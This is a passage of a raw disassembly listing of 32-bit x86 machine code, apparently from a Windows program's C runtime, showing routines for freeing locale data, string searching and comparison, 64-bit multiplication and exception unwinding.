  408bb1:	ff 76 4c             	push   0x4c(%esi)
  408bb4:	e8 f2 af ff ff       	call   0x403bab
  408bb9:	ff 76 50             	push   0x50(%esi)
  408bbc:	e8 ea af ff ff       	call   0x403bab
  408bc1:	ff 76 54             	push   0x54(%esi)
  408bc4:	e8 e2 af ff ff       	call   0x403bab
  408bc9:	ff 76 58             	push   0x58(%esi)
  408bcc:	e8 da af ff ff       	call   0x403bab
  408bd1:	ff 76 5c             	push   0x5c(%esi)
  408bd4:	e8 d2 af ff ff       	call   0x403bab
  408bd9:	ff 76 60             	push   0x60(%esi)
  408bdc:	e8 ca af ff ff       	call   0x403bab
  408be1:	ff 76 64             	push   0x64(%esi)
  408be4:	e8 c2 af ff ff       	call   0x403bab
  408be9:	ff 76 68             	push   0x68(%esi)
  408bec:	e8 ba af ff ff       	call   0x403bab
  408bf1:	ff 76 6c             	push   0x6c(%esi)
  408bf4:	e8 b2 af ff ff       	call   0x403bab
  408bf9:	ff 76 70             	push   0x70(%esi)
  408bfc:	e8 aa af ff ff       	call   0x403bab
  408c01:	ff 76 74             	push   0x74(%esi)
  408c04:	e8 a2 af ff ff       	call   0x403bab
  408c09:	ff 76 78             	push   0x78(%esi)
  408c0c:	e8 9a af ff ff       	call   0x403bab
  408c11:	ff 76 7c             	push   0x7c(%esi)
  408c14:	e8 92 af ff ff       	call   0x403bab
  408c19:	83 c4 40             	add    $0x40,%esp
  408c1c:	ff b6 80 00 00 00    	push   0x80(%esi)
  408c22:	e8 84 af ff ff       	call   0x403bab
  408c27:	ff b6 84 00 00 00    	push   0x84(%esi)
  408c2d:	e8 79 af ff ff       	call   0x403bab
  408c32:	ff b6 88 00 00 00    	push   0x88(%esi)
  408c38:	e8 6e af ff ff       	call   0x403bab
  408c3d:	ff b6 8c 00 00 00    	push   0x8c(%esi)
  408c43:	e8 63 af ff ff       	call   0x403bab
  408c48:	ff b6 90 00 00 00    	push   0x90(%esi)
  408c4e:	e8 58 af ff ff       	call   0x403bab
  408c53:	ff b6 94 00 00 00    	push   0x94(%esi)
  408c59:	e8 4d af ff ff       	call   0x403bab
  408c5e:	ff b6 98 00 00 00    	push   0x98(%esi)
  408c64:	e8 42 af ff ff       	call   0x403bab
  408c69:	ff b6 9c 00 00 00    	push   0x9c(%esi)
  408c6f:	e8 37 af ff ff       	call   0x403bab
  408c74:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  408c7a:	e8 2c af ff ff       	call   0x403bab
  408c7f:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  408c85:	e8 21 af ff ff       	call   0x403bab
  408c8a:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  408c90:	e8 16 af ff ff       	call   0x403bab
  408c95:	ff b6 bc 00 00 00    	push   0xbc(%esi)
  408c9b:	e8 0b af ff ff       	call   0x403bab
  408ca0:	ff b6 c0 00 00 00    	push   0xc0(%esi)
  408ca6:	e8 00 af ff ff       	call   0x403bab
  408cab:	ff b6 c4 00 00 00    	push   0xc4(%esi)
  408cb1:	e8 f5 ae ff ff       	call   0x403bab
  408cb6:	ff b6 c8 00 00 00    	push   0xc8(%esi)
  408cbc:	e8 ea ae ff ff       	call   0x403bab
  408cc1:	ff b6 cc 00 00 00    	push   0xcc(%esi)
  408cc7:	e8 df ae ff ff       	call   0x403bab
  408ccc:	83 c4 40             	add    $0x40,%esp
  408ccf:	ff b6 d0 00 00 00    	push   0xd0(%esi)
  408cd5:	e8 d1 ae ff ff       	call   0x403bab
  408cda:	ff b6 b8 00 00 00    	push   0xb8(%esi)
  408ce0:	e8 c6 ae ff ff       	call   0x403bab
  408ce5:	ff b6 d8 00 00 00    	push   0xd8(%esi)
  408ceb:	e8 bb ae ff ff       	call   0x403bab
  408cf0:	ff b6 dc 00 00 00    	push   0xdc(%esi)
  408cf6:	e8 b0 ae ff ff       	call   0x403bab
  408cfb:	ff b6 e0 00 00 00    	push   0xe0(%esi)
  408d01:	e8 a5 ae ff ff       	call   0x403bab
  408d06:	ff b6 e4 00 00 00    	push   0xe4(%esi)
  408d0c:	e8 9a ae ff ff       	call   0x403bab
  408d11:	ff b6 e8 00 00 00    	push   0xe8(%esi)
  408d17:	e8 8f ae ff ff       	call   0x403bab
  408d1c:	ff b6 ec 00 00 00    	push   0xec(%esi)
  408d22:	e8 84 ae ff ff       	call   0x403bab
  408d27:	ff b6 d4 00 00 00    	push   0xd4(%esi)
  408d2d:	e8 79 ae ff ff       	call   0x403bab
  408d32:	ff b6 f0 00 00 00    	push   0xf0(%esi)
  408d38:	e8 6e ae ff ff       	call   0x403bab
  408d3d:	ff b6 f4 00 00 00    	push   0xf4(%esi)
  408d43:	e8 63 ae ff ff       	call   0x403bab
  408d48:	ff b6 f8 00 00 00    	push   0xf8(%esi)
  408d4e:	e8 58 ae ff ff       	call   0x403bab
  408d53:	ff b6 fc 00 00 00    	push   0xfc(%esi)
  408d59:	e8 4d ae ff ff       	call   0x403bab
  408d5e:	ff b6 00 01 00 00    	push   0x100(%esi)
  408d64:	e8 42 ae ff ff       	call   0x403bab
  408d69:	ff b6 04 01 00 00    	push   0x104(%esi)
  408d6f:	e8 37 ae ff ff       	call   0x403bab
  408d74:	ff b6 08 01 00 00    	push   0x108(%esi)
  408d7a:	e8 2c ae ff ff       	call   0x403bab
  408d7f:	83 c4 40             	add    $0x40,%esp
  408d82:	ff b6 0c 01 00 00    	push   0x10c(%esi)
  408d88:	e8 1e ae ff ff       	call   0x403bab
  408d8d:	ff b6 10 01 00 00    	push   0x110(%esi)
  408d93:	e8 13 ae ff ff       	call   0x403bab
  408d98:	ff b6 14 01 00 00    	push   0x114(%esi)
  408d9e:	e8 08 ae ff ff       	call   0x403bab
  408da3:	ff b6 18 01 00 00    	push   0x118(%esi)
  408da9:	e8 fd ad ff ff       	call   0x403bab
  408dae:	ff b6 1c 01 00 00    	push   0x11c(%esi)
  408db4:	e8 f2 ad ff ff       	call   0x403bab
  408db9:	ff b6 20 01 00 00    	push   0x120(%esi)
  408dbf:	e8 e7 ad ff ff       	call   0x403bab
  408dc4:	ff b6 24 01 00 00    	push   0x124(%esi)
  408dca:	e8 dc ad ff ff       	call   0x403bab
  408dcf:	ff b6 28 01 00 00    	push   0x128(%esi)
  408dd5:	e8 d1 ad ff ff       	call   0x403bab
  408dda:	ff b6 2c 01 00 00    	push   0x12c(%esi)
  408de0:	e8 c6 ad ff ff       	call   0x403bab
  408de5:	ff b6 30 01 00 00    	push   0x130(%esi)
  408deb:	e8 bb ad ff ff       	call   0x403bab
  408df0:	ff b6 34 01 00 00    	push   0x134(%esi)
  408df6:	e8 b0 ad ff ff       	call   0x403bab
  408dfb:	ff b6 38 01 00 00    	push   0x138(%esi)
  408e01:	e8 a5 ad ff ff       	call   0x403bab
  408e06:	ff b6 3c 01 00 00    	push   0x13c(%esi)
  408e0c:	e8 9a ad ff ff       	call   0x403bab
  408e11:	ff b6 40 01 00 00    	push   0x140(%esi)
  408e17:	e8 8f ad ff ff       	call   0x403bab
  408e1c:	ff b6 44 01 00 00    	push   0x144(%esi)
  408e22:	e8 84 ad ff ff       	call   0x403bab
  408e27:	ff b6 48 01 00 00    	push   0x148(%esi)
  408e2d:	e8 79 ad ff ff       	call   0x403bab
  408e32:	83 c4 40             	add    $0x40,%esp
  408e35:	ff b6 4c 01 00 00    	push   0x14c(%esi)
  408e3b:	e8 6b ad ff ff       	call   0x403bab
  408e40:	ff b6 50 01 00 00    	push   0x150(%esi)
  408e46:	e8 60 ad ff ff       	call   0x403bab
  408e4b:	ff b6 54 01 00 00    	push   0x154(%esi)
  408e51:	e8 55 ad ff ff       	call   0x403bab
  408e56:	ff b6 58 01 00 00    	push   0x158(%esi)
  408e5c:	e8 4a ad ff ff       	call   0x403bab
  408e61:	ff b6 5c 01 00 00    	push   0x15c(%esi)
  408e67:	e8 3f ad ff ff       	call   0x403bab
  408e6c:	ff b6 60 01 00 00    	push   0x160(%esi)
  408e72:	e8 34 ad ff ff       	call   0x403bab
  408e77:	83 c4 18             	add    $0x18,%esp
  408e7a:	5e                   	pop    %esi
  408e7b:	5d                   	pop    %ebp
  408e7c:	c3                   	ret
  408e7d:	8b ff                	mov    %edi,%edi
  408e7f:	55                   	push   %ebp
  408e80:	8b ec                	mov    %esp,%ebp
  408e82:	56                   	push   %esi
  408e83:	8b 75 08             	mov    0x8(%ebp),%esi
  408e86:	85 f6                	test   %esi,%esi
  408e88:	74 59                	je     0x408ee3
  408e8a:	8b 06                	mov    (%esi),%eax
  408e8c:	3b 05 f8 fe 40 00    	cmp    0x40fef8,%eax
  408e92:	74 07                	je     0x408e9b
  408e94:	50                   	push   %eax
  408e95:	e8 11 ad ff ff       	call   0x403bab
  408e9a:	59                   	pop    %ecx
  408e9b:	8b 46 04             	mov    0x4(%esi),%eax
  408e9e:	3b 05 fc fe 40 00    	cmp    0x40fefc,%eax
  408ea4:	74 07                	je     0x408ead
  408ea6:	50                   	push   %eax
  408ea7:	e8 ff ac ff ff       	call   0x403bab
  408eac:	59                   	pop    %ecx
  408ead:	8b 46 08             	mov    0x8(%esi),%eax
  408eb0:	3b 05 00 ff 40 00    	cmp    0x40ff00,%eax
  408eb6:	74 07                	je     0x408ebf
  408eb8:	50                   	push   %eax
  408eb9:	e8 ed ac ff ff       	call   0x403bab
  408ebe:	59                   	pop    %ecx
  408ebf:	8b 46 30             	mov    0x30(%esi),%eax
  408ec2:	3b 05 28 ff 40 00    	cmp    0x40ff28,%eax
  408ec8:	74 07                	je     0x408ed1
  408eca:	50                   	push   %eax
  408ecb:	e8 db ac ff ff       	call   0x403bab
  408ed0:	59                   	pop    %ecx
  408ed1:	8b 76 34             	mov    0x34(%esi),%esi
  408ed4:	3b 35 2c ff 40 00    	cmp    0x40ff2c,%esi
  408eda:	74 07                	je     0x408ee3
  408edc:	56                   	push   %esi
  408edd:	e8 c9 ac ff ff       	call   0x403bab
  408ee2:	59                   	pop    %ecx
  408ee3:	5e                   	pop    %esi
  408ee4:	5d                   	pop    %ebp
  408ee5:	c3                   	ret
  408ee6:	8b ff                	mov    %edi,%edi
  408ee8:	55                   	push   %ebp
  408ee9:	8b ec                	mov    %esp,%ebp
  408eeb:	56                   	push   %esi
  408eec:	8b 75 08             	mov    0x8(%ebp),%esi
  408eef:	85 f6                	test   %esi,%esi
  408ef1:	0f 84 ea 00 00 00    	je     0x408fe1
  408ef7:	8b 46 0c             	mov    0xc(%esi),%eax
  408efa:	3b 05 04 ff 40 00    	cmp    0x40ff04,%eax
  408f00:	74 07                	je     0x408f09
  408f02:	50                   	push   %eax
  408f03:	e8 a3 ac ff ff       	call   0x403bab
  408f08:	59                   	pop    %ecx
  408f09:	8b 46 10             	mov    0x10(%esi),%eax
  408f0c:	3b 05 08 ff 40 00    	cmp    0x40ff08,%eax
  408f12:	74 07                	je     0x408f1b
  408f14:	50                   	push   %eax
  408f15:	e8 91 ac ff ff       	call   0x403bab
  408f1a:	59                   	pop    %ecx
  408f1b:	8b 46 14             	mov    0x14(%esi),%eax
  408f1e:	3b 05 0c ff 40 00    	cmp    0x40ff0c,%eax
  408f24:	74 07                	je     0x408f2d
  408f26:	50                   	push   %eax
  408f27:	e8 7f ac ff ff       	call   0x403bab
  408f2c:	59                   	pop    %ecx
  408f2d:	8b 46 18             	mov    0x18(%esi),%eax
  408f30:	3b 05 10 ff 40 00    	cmp    0x40ff10,%eax
  408f36:	74 07                	je     0x408f3f
  408f38:	50                   	push   %eax
  408f39:	e8 6d ac ff ff       	call   0x403bab
  408f3e:	59                   	pop    %ecx
  408f3f:	8b 46 1c             	mov    0x1c(%esi),%eax
  408f42:	3b 05 14 ff 40 00    	cmp    0x40ff14,%eax
  408f48:	74 07                	je     0x408f51
  408f4a:	50                   	push   %eax
  408f4b:	e8 5b ac ff ff       	call   0x403bab
  408f50:	59                   	pop    %ecx
  408f51:	8b 46 20             	mov    0x20(%esi),%eax
  408f54:	3b 05 18 ff 40 00    	cmp    0x40ff18,%eax
  408f5a:	74 07                	je     0x408f63
  408f5c:	50                   	push   %eax
  408f5d:	e8 49 ac ff ff       	call   0x403bab
  408f62:	59                   	pop    %ecx
  408f63:	8b 46 24             	mov    0x24(%esi),%eax
  408f66:	3b 05 1c ff 40 00    	cmp    0x40ff1c,%eax
  408f6c:	74 07                	je     0x408f75
  408f6e:	50                   	push   %eax
  408f6f:	e8 37 ac ff ff       	call   0x403bab
  408f74:	59                   	pop    %ecx
  408f75:	8b 46 38             	mov    0x38(%esi),%eax
  408f78:	3b 05 30 ff 40 00    	cmp    0x40ff30,%eax
  408f7e:	74 07                	je     0x408f87
  408f80:	50                   	push   %eax
  408f81:	e8 25 ac ff ff       	call   0x403bab
  408f86:	59                   	pop    %ecx
  408f87:	8b 46 3c             	mov    0x3c(%esi),%eax
  408f8a:	3b 05 34 ff 40 00    	cmp    0x40ff34,%eax
  408f90:	74 07                	je     0x408f99
  408f92:	50                   	push   %eax
  408f93:	e8 13 ac ff ff       	call   0x403bab
  408f98:	59                   	pop    %ecx
  408f99:	8b 46 40             	mov    0x40(%esi),%eax
  408f9c:	3b 05 38 ff 40 00    	cmp    0x40ff38,%eax
  408fa2:	74 07                	je     0x408fab
  408fa4:	50                   	push   %eax
  408fa5:	e8 01 ac ff ff       	call   0x403bab
  408faa:	59                   	pop    %ecx
  408fab:	8b 46 44             	mov    0x44(%esi),%eax
  408fae:	3b 05 3c ff 40 00    	cmp    0x40ff3c,%eax
  408fb4:	74 07                	je     0x408fbd
  408fb6:	50                   	push   %eax
  408fb7:	e8 ef ab ff ff       	call   0x403bab
  408fbc:	59                   	pop    %ecx
  408fbd:	8b 46 48             	mov    0x48(%esi),%eax
  408fc0:	3b 05 40 ff 40 00    	cmp    0x40ff40,%eax
  408fc6:	74 07                	je     0x408fcf
  408fc8:	50                   	push   %eax
  408fc9:	e8 dd ab ff ff       	call   0x403bab
  408fce:	59                   	pop    %ecx
  408fcf:	8b 76 4c             	mov    0x4c(%esi),%esi
  408fd2:	3b 35 44 ff 40 00    	cmp    0x40ff44,%esi
  408fd8:	74 07                	je     0x408fe1
  408fda:	56                   	push   %esi
  408fdb:	e8 cb ab ff ff       	call   0x403bab
  408fe0:	59                   	pop    %ecx
  408fe1:	5e                   	pop    %esi
  408fe2:	5d                   	pop    %ebp
  408fe3:	c3                   	ret
  408fe4:	cc                   	int3
  408fe5:	cc                   	int3
  408fe6:	cc                   	int3
  408fe7:	cc                   	int3
  408fe8:	cc                   	int3
  408fe9:	cc                   	int3
  408fea:	cc                   	int3
  408feb:	cc                   	int3
  408fec:	cc                   	int3
  408fed:	cc                   	int3
  408fee:	cc                   	int3
  408fef:	cc                   	int3
  408ff0:	8d 42 ff             	lea    -0x1(%edx),%eax
  408ff3:	5b                   	pop    %ebx
  408ff4:	c3                   	ret
  408ff5:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  408ffc:	8d 64 24 00          	lea    0x0(%esp),%esp
  409000:	33 c0                	xor    %eax,%eax
  409002:	8a 44 24 08          	mov    0x8(%esp),%al
  409006:	53                   	push   %ebx
  409007:	8b d8                	mov    %eax,%ebx
  409009:	c1 e0 08             	shl    $0x8,%eax
  40900c:	8b 54 24 08          	mov    0x8(%esp),%edx
  409010:	f7 c2 03 00 00 00    	test   $0x3,%edx
  409016:	74 15                	je     0x40902d
  409018:	8a 0a                	mov    (%edx),%cl
  40901a:	83 c2 01             	add    $0x1,%edx
  40901d:	3a cb                	cmp    %bl,%cl
  40901f:	74 cf                	je     0x408ff0
  409021:	84 c9                	test   %cl,%cl
  409023:	74 51                	je     0x409076
  409025:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40902b:	75 eb                	jne    0x409018
  40902d:	0b d8                	or     %eax,%ebx
  40902f:	57                   	push   %edi
  409030:	8b c3                	mov    %ebx,%eax
  409032:	c1 e3 10             	shl    $0x10,%ebx
  409035:	56                   	push   %esi
  409036:	0b d8                	or     %eax,%ebx
  409038:	8b 0a                	mov    (%edx),%ecx
  40903a:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  40903f:	8b c1                	mov    %ecx,%eax
  409041:	8b f7                	mov    %edi,%esi
  409043:	33 cb                	xor    %ebx,%ecx
  409045:	03 f0                	add    %eax,%esi
  409047:	03 f9                	add    %ecx,%edi
  409049:	83 f1 ff             	xor    $0xffffffff,%ecx
  40904c:	83 f0 ff             	xor    $0xffffffff,%eax
  40904f:	33 cf                	xor    %edi,%ecx
  409051:	33 c6                	xor    %esi,%eax
  409053:	83 c2 04             	add    $0x4,%edx
  409056:	81 e1 00 01 01 81    	and    $0x81010100,%ecx
  40905c:	75 1c                	jne    0x40907a
  40905e:	25 00 01 01 81       	and    $0x81010100,%eax
  409063:	74 d3                	je     0x409038
  409065:	25 00 01 01 01       	and    $0x1010100,%eax
  40906a:	75 08                	jne    0x409074
  40906c:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  409072:	75 c4                	jne    0x409038
  409074:	5e                   	pop    %esi
  409075:	5f                   	pop    %edi
  409076:	5b                   	pop    %ebx
  409077:	33 c0                	xor    %eax,%eax
  409079:	c3                   	ret
  40907a:	8b 42 fc             	mov    -0x4(%edx),%eax
  40907d:	3a c3                	cmp    %bl,%al
  40907f:	74 36                	je     0x4090b7
  409081:	84 c0                	test   %al,%al
  409083:	74 ef                	je     0x409074
  409085:	3a e3                	cmp    %bl,%ah
  409087:	74 27                	je     0x4090b0
  409089:	84 e4                	test   %ah,%ah
  40908b:	74 e7                	je     0x409074
  40908d:	c1 e8 10             	shr    $0x10,%eax
  409090:	3a c3                	cmp    %bl,%al
  409092:	74 15                	je     0x4090a9
  409094:	84 c0                	test   %al,%al
  409096:	74 dc                	je     0x409074
  409098:	3a e3                	cmp    %bl,%ah
  40909a:	74 06                	je     0x4090a2
  40909c:	84 e4                	test   %ah,%ah
  40909e:	74 d4                	je     0x409074
  4090a0:	eb 96                	jmp    0x409038
  4090a2:	5e                   	pop    %esi
  4090a3:	5f                   	pop    %edi
  4090a4:	8d 42 ff             	lea    -0x1(%edx),%eax
  4090a7:	5b                   	pop    %ebx
  4090a8:	c3                   	ret
  4090a9:	8d 42 fe             	lea    -0x2(%edx),%eax
  4090ac:	5e                   	pop    %esi
  4090ad:	5f                   	pop    %edi
  4090ae:	5b                   	pop    %ebx
  4090af:	c3                   	ret
  4090b0:	8d 42 fd             	lea    -0x3(%edx),%eax
  4090b3:	5e                   	pop    %esi
  4090b4:	5f                   	pop    %edi
  4090b5:	5b                   	pop    %ebx
  4090b6:	c3                   	ret
  4090b7:	8d 42 fc             	lea    -0x4(%edx),%eax
  4090ba:	5e                   	pop    %esi
  4090bb:	5f                   	pop    %edi
  4090bc:	5b                   	pop    %ebx
  4090bd:	c3                   	ret
  4090be:	cc                   	int3
  4090bf:	cc                   	int3
  4090c0:	51                   	push   %ecx
  4090c1:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4090c5:	2b c8                	sub    %eax,%ecx
  4090c7:	83 e1 0f             	and    $0xf,%ecx
  4090ca:	03 c1                	add    %ecx,%eax
  4090cc:	1b c9                	sbb    %ecx,%ecx
  4090ce:	0b c1                	or     %ecx,%eax
  4090d0:	59                   	pop    %ecx
  4090d1:	e9 6a e5 ff ff       	jmp    0x407640
  4090d6:	51                   	push   %ecx
  4090d7:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4090db:	2b c8                	sub    %eax,%ecx
  4090dd:	83 e1 07             	and    $0x7,%ecx
  4090e0:	03 c1                	add    %ecx,%eax
  4090e2:	1b c9                	sbb    %ecx,%ecx
  4090e4:	0b c1                	or     %ecx,%eax
  4090e6:	59                   	pop    %ecx
  4090e7:	e9 54 e5 ff ff       	jmp    0x407640
  4090ec:	cc                   	int3
  4090ed:	cc                   	int3
  4090ee:	cc                   	int3
  4090ef:	cc                   	int3
  4090f0:	55                   	push   %ebp
  4090f1:	8b ec                	mov    %esp,%ebp
  4090f3:	56                   	push   %esi
  4090f4:	33 c0                	xor    %eax,%eax
  4090f6:	50                   	push   %eax
  4090f7:	50                   	push   %eax
  4090f8:	50                   	push   %eax
  4090f9:	50                   	push   %eax
  4090fa:	50                   	push   %eax
  4090fb:	50                   	push   %eax
  4090fc:	50                   	push   %eax
  4090fd:	50                   	push   %eax
  4090fe:	8b 55 0c             	mov    0xc(%ebp),%edx
  409101:	8d 49 00             	lea    0x0(%ecx),%ecx
  409104:	8a 02                	mov    (%edx),%al
  409106:	0a c0                	or     %al,%al
  409108:	74 09                	je     0x409113
  40910a:	83 c2 01             	add    $0x1,%edx
  40910d:	0f ab 04 24          	bts    %eax,(%esp)
  409111:	eb f1                	jmp    0x409104
  409113:	8b 75 08             	mov    0x8(%ebp),%esi
  409116:	83 c9 ff             	or     $0xffffffff,%ecx
  409119:	8d 49 00             	lea    0x0(%ecx),%ecx
  40911c:	83 c1 01             	add    $0x1,%ecx
  40911f:	8a 06                	mov    (%esi),%al
  409121:	0a c0                	or     %al,%al
  409123:	74 09                	je     0x40912e
  409125:	83 c6 01             	add    $0x1,%esi
  409128:	0f a3 04 24          	bt     %eax,(%esp)
  40912c:	73 ee                	jae    0x40911c
  40912e:	8b c1                	mov    %ecx,%eax
  409130:	83 c4 20             	add    $0x20,%esp
  409133:	5e                   	pop    %esi
  409134:	c9                   	leave
  409135:	c3                   	ret
  409136:	cc                   	int3
  409137:	cc                   	int3
  409138:	cc                   	int3
  409139:	cc                   	int3
  40913a:	cc                   	int3
  40913b:	cc                   	int3
  40913c:	cc                   	int3
  40913d:	cc                   	int3
  40913e:	cc                   	int3
  40913f:	cc                   	int3
  409140:	55                   	push   %ebp
  409141:	8b ec                	mov    %esp,%ebp
  409143:	56                   	push   %esi
  409144:	33 c0                	xor    %eax,%eax
  409146:	50                   	push   %eax
  409147:	50                   	push   %eax
  409148:	50                   	push   %eax
  409149:	50                   	push   %eax
  40914a:	50                   	push   %eax
  40914b:	50                   	push   %eax
  40914c:	50                   	push   %eax
  40914d:	50                   	push   %eax
  40914e:	8b 55 0c             	mov    0xc(%ebp),%edx
  409151:	8d 49 00             	lea    0x0(%ecx),%ecx
  409154:	8a 02                	mov    (%edx),%al
  409156:	0a c0                	or     %al,%al
  409158:	74 09                	je     0x409163
  40915a:	83 c2 01             	add    $0x1,%edx
  40915d:	0f ab 04 24          	bts    %eax,(%esp)
  409161:	eb f1                	jmp    0x409154
  409163:	8b 75 08             	mov    0x8(%ebp),%esi
  409166:	8b ff                	mov    %edi,%edi
  409168:	8a 06                	mov    (%esi),%al
  40916a:	0a c0                	or     %al,%al
  40916c:	74 0c                	je     0x40917a
  40916e:	83 c6 01             	add    $0x1,%esi
  409171:	0f a3 04 24          	bt     %eax,(%esp)
  409175:	73 f1                	jae    0x409168
  409177:	8d 46 ff             	lea    -0x1(%esi),%eax
  40917a:	83 c4 20             	add    $0x20,%esp
  40917d:	5e                   	pop    %esi
  40917e:	c9                   	leave
  40917f:	c3                   	ret
  409180:	8b 44 24 08          	mov    0x8(%esp),%eax
  409184:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  409188:	0b c8                	or     %eax,%ecx
  40918a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40918e:	75 09                	jne    0x409199
  409190:	8b 44 24 04          	mov    0x4(%esp),%eax
  409194:	f7 e1                	mul    %ecx
  409196:	c2 10 00             	ret    $0x10
  409199:	53                   	push   %ebx
  40919a:	f7 e1                	mul    %ecx
  40919c:	8b d8                	mov    %eax,%ebx
  40919e:	8b 44 24 08          	mov    0x8(%esp),%eax
  4091a2:	f7 64 24 14          	mull   0x14(%esp)
  4091a6:	03 d8                	add    %eax,%ebx
  4091a8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4091ac:	f7 e1                	mul    %ecx
  4091ae:	03 d3                	add    %ebx,%edx
  4091b0:	5b                   	pop    %ebx
  4091b1:	c2 10 00             	ret    $0x10
  4091b4:	cc                   	int3
  4091b5:	cc                   	int3
  4091b6:	cc                   	int3
  4091b7:	cc                   	int3
  4091b8:	cc                   	int3
  4091b9:	cc                   	int3
  4091ba:	cc                   	int3
  4091bb:	cc                   	int3
  4091bc:	cc                   	int3
  4091bd:	cc                   	int3
  4091be:	cc                   	int3
  4091bf:	cc                   	int3
  4091c0:	55                   	push   %ebp
  4091c1:	8b ec                	mov    %esp,%ebp
  4091c3:	57                   	push   %edi
  4091c4:	56                   	push   %esi
  4091c5:	53                   	push   %ebx
  4091c6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4091c9:	0b c9                	or     %ecx,%ecx
  4091cb:	74 4d                	je     0x40921a
  4091cd:	8b 75 08             	mov    0x8(%ebp),%esi
  4091d0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4091d3:	b7 41                	mov    $0x41,%bh
  4091d5:	b3 5a                	mov    $0x5a,%bl
  4091d7:	b6 20                	mov    $0x20,%dh
  4091d9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4091dc:	8a 26                	mov    (%esi),%ah
  4091de:	0a e4                	or     %ah,%ah
  4091e0:	8a 07                	mov    (%edi),%al
  4091e2:	74 27                	je     0x40920b
  4091e4:	0a c0                	or     %al,%al
  4091e6:	74 23                	je     0x40920b
  4091e8:	83 c6 01             	add    $0x1,%esi
  4091eb:	83 c7 01             	add    $0x1,%edi
  4091ee:	3a e7                	cmp    %bh,%ah
  4091f0:	72 06                	jb     0x4091f8
  4091f2:	3a e3                	cmp    %bl,%ah
  4091f4:	77 02                	ja     0x4091f8
  4091f6:	02 e6                	add    %dh,%ah
  4091f8:	3a c7                	cmp    %bh,%al
  4091fa:	72 06                	jb     0x409202
  4091fc:	3a c3                	cmp    %bl,%al
  4091fe:	77 02                	ja     0x409202
  409200:	02 c6                	add    %dh,%al
  409202:	3a e0                	cmp    %al,%ah
  409204:	75 0b                	jne    0x409211
  409206:	83 e9 01             	sub    $0x1,%ecx
  409209:	75 d1                	jne    0x4091dc
  40920b:	33 c9                	xor    %ecx,%ecx
  40920d:	3a e0                	cmp    %al,%ah
  40920f:	74 09                	je     0x40921a
  409211:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  409216:	72 02                	jb     0x40921a
  409218:	f7 d9                	neg    %ecx
  40921a:	8b c1                	mov    %ecx,%eax
  40921c:	5b                   	pop    %ebx
  40921d:	5e                   	pop    %esi
  40921e:	5f                   	pop    %edi
  40921f:	c9                   	leave
  409220:	c3                   	ret
  409221:	cc                   	int3
  409222:	ff 25 08 b1 40 00    	jmp    *0x40b108
  409228:	8b ff                	mov    %edi,%edi
  40922a:	55                   	push   %ebp
  40922b:	8b ec                	mov    %esp,%ebp
  40922d:	51                   	push   %ecx
  40922e:	53                   	push   %ebx
  40922f:	8b 45 0c             	mov    0xc(%ebp),%eax
  409232:	83 c0 0c             	add    $0xc,%eax
  409235:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409238:	64 8b 1d 00 00 00 00 	mov    %fs:0x0,%ebx
  40923f:	8b 03                	mov    (%ebx),%eax
  409241:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  409247:	8b 45 08             	mov    0x8(%ebp),%eax
  40924a:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40924d:	8b 6d fc             	mov    -0x4(%ebp),%ebp
  409250:	8b 63 fc             	mov    -0x4(%ebx),%esp
  409253:	ff e0                	jmp    *%eax
  409255:	5b                   	pop    %ebx
  409256:	c9                   	leave
  409257:	c2 08 00             	ret    $0x8
  40925a:	58                   	pop    %eax
  40925b:	59                   	pop    %ecx
  40925c:	87 04 24             	xchg   %eax,(%esp)
  40925f:	ff e0                	jmp    *%eax
  409261:	8b ff                	mov    %edi,%edi
  409263:	55                   	push   %ebp
  409264:	8b ec                	mov    %esp,%ebp
  409266:	51                   	push   %ecx
  409267:	51                   	push   %ecx
  409268:	53                   	push   %ebx
  409269:	56                   	push   %esi
  40926a:	57                   	push   %edi
  40926b:	64 8b 35 00 00 00 00 	mov    %fs:0x0,%esi
  409272:	89 75 fc             	mov    %esi,-0x4(%ebp)
  409275:	c7 45 f8 8c 92 40 00 	movl   $0x40928c,-0x8(%ebp)
  40927c:	6a 00                	push   $0x0
  40927e:	ff 75 0c             	push   0xc(%ebp)
  409281:	ff 75 f8             	push   -0x8(%ebp)
  409284:	ff 75 08             	push   0x8(%ebp)
  409287:	e8 96 ff ff ff       	call   0x409222
  40928c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40928f:	8b 40 04             	mov    0x4(%eax),%eax
  409292:	83 e0 fd             	and    $0xfffffffd,%eax
  409295:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409298:	89 41 04             	mov    %eax,0x4(%ecx)
  40929b:	64 8b 3d 00 00 00 00 	mov    %fs:0x0,%edi
  4092a2:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4092a5:	89 3b                	mov    %edi,(%ebx)
  4092a7:	64 89 1d 00 00 00 00 	mov    %ebx,%fs:0x0
  4092ae:	5f                   	pop    %edi
  4092af:	5e                   	pop    %esi
  4092b0:	5b                   	pop    %ebx
  4092b1:	c9                   	leave
  4092b2:	c2 08 00             	ret    $0x8
  4092b5:	55                   	push   %ebp
  4092b6:	8b ec                	mov    %esp,%ebp
  4092b8:	83 ec 08             	sub    $0x8,%esp
  4092bb:	53                   	push   %ebx
  4092bc:	56                   	push   %esi
  4092bd:	57                   	push   %edi
  4092be:	fc                   	cld
  4092bf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4092c2:	33 c0                	xor    %eax,%eax
  4092c4:	50                   	push   %eax
  4092c5:	50                   	push   %eax
  4092c6:	50                   	push   %eax
  4092c7:	ff 75 fc             	push   -0x4(%ebp)
  4092ca:	ff 75 14             	push   0x14(%ebp)
  4092cd:	ff 75 10             	push   0x10(%ebp)
